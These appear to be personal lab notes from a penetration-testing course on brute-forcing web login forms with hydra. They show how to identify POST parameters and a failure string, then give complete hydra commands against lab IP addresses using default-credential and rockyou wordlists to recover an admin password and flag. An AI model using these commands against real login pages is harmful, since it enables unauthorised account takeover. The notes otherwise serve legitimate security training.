# 👨‍⚖️ Web Forms Brute Forcing

Many admin panels have also implemented features or elements such as the [b374k shell](https://github.com/b374k/b374k) that might allow us to execute OS commands directly.

Here is a command to see all of the requests we can use in hydra:

```shell-session
hydra -h | grep "Supported services" | tr ":" "\n" | tr " " "\n" | column -e
```

Here are some `http` modules that are interesting for us:

1. `http[s]-{head|get|post}`
2. `http[s]-post-form`

The 1st module serves for basic HTTP authentication, while the 2nd module is used for login forms, like `.php` or `.aspx` and others.

To decide which module needs to be used, we need to know if the application uses `GET` or a `POST` form. We can test it by trying to log in and pay attention to the URL. If we recognize that any of our input was pasted into the `URL`, the web application uses a `GET` form. Otherwise, it uses a `POST` form.

Our URL does not change, we know that the web application uses a `POST` form so let's use `http-post-form` module and use the "`-U`" flag to list the parameters it requires

so in our case we need:

* `URL path`, which holds the login form
* `POST parameters` for username/password
* `A failed/success login string`, which lets hydra recognize whether the login attempt was successful

```shell-session
/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:[FAIL/SUCCESS]=[success/failed string]
```

And if we do not see any error message, we can go ahead and specify something from the source code like `<form name='login'`, which should be distinct enough and will probably not exist after a successful login.

So here will be our final request:

```bash
"/login.php:[user parameter]=^USER^&[password parameter]=^PASS^:F=<form name='login'"
```

to have the parameters we need we can simply go and look at the inspector panel:

<figure><img src="../../../.gitbook/assets/image (10) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

This would give us the following POST parameters:

```bash
username=test&password=test
```

Or the copy as curl would give us plenty of informations as well as the parameters we need:

<pre><code><strong>...&#x3C;SNIP>    --data-raw 'username=test&#x26;password=test'
</strong></code></pre>

and of course in burp we can also get those informations:

<figure><img src="../../../.gitbook/assets/image (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

So the final parameters would look something like that:

```bash
"/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

We can start by looking for default credentials with the `ftp-betterdefaultpasslist.txt`

And so, the FINAL PAYLOAD will come out like this:

```shell-session
hydra -C /opt/useful/SecLists/Passwords/Default-Credentials/ftp-betterdefaultpasslist.txt 178.35.49.134 -s 32901 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<form name='login'"
```

_**Using what you learned in this section, try attacking the '/login.php' page to identify the password for the 'admin' user. Once you login, you should find a flag. Submit the flag as the answer.**_

<figure><img src="../../../.gitbook/assets/image (2) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption><p>username=admin password=admin</p></figcaption></figure>

```
hydra -l admin -P /usr/share/wordlists/rockyou.txt.gz 94.237.51.88 -s 52477 http-post-form "/login.php:username=^USER^&password=^PASS^:F=<input name='username'" -V
```

<figure><img src="../../../.gitbook/assets/image (3) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>

<figure><img src="../../../.gitbook/assets/image (4) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1) (1).png" alt=""><figcaption></figcaption></figure>
